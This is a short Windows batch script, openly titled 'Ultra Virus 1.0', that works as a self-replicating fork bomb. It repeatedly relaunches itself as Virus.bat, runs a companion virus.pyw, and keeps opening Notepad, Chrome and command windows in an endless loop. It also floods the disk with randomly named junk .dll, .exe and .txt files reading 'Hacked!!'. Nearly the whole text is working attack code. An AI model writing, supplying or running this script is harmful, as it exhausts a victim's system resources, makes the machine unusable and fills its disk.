@echo off
title Ultra Virus 1.0
color 4
cls
echo =========================================
echo                                         !
echo                 Virus 1.0               +
echo         Made by BlackBatman1980         ! 
echo =========================================
echo [!] Exit Terminal To Terminate Program
echo =========================================
echo [!] Starting...
goto loop

:loop
start Virus.bat
echo Hacked!! > %random%.dll
echo Hacked!! > %random%.exe
echo Hacked!! > %random%.txt
start Virus.bat
goto starter


:starter
start Virus.bat
python3 virus.pyw
start notepad.exe
start chrome.exe
python3 virus.pyw
start cmd.exe
start Virus.bat
python3 virus.pyw
start chrome.exe
start notepad.exe
python3 virus.pyw
start cmd.exe
start Virus.bat
goto loop
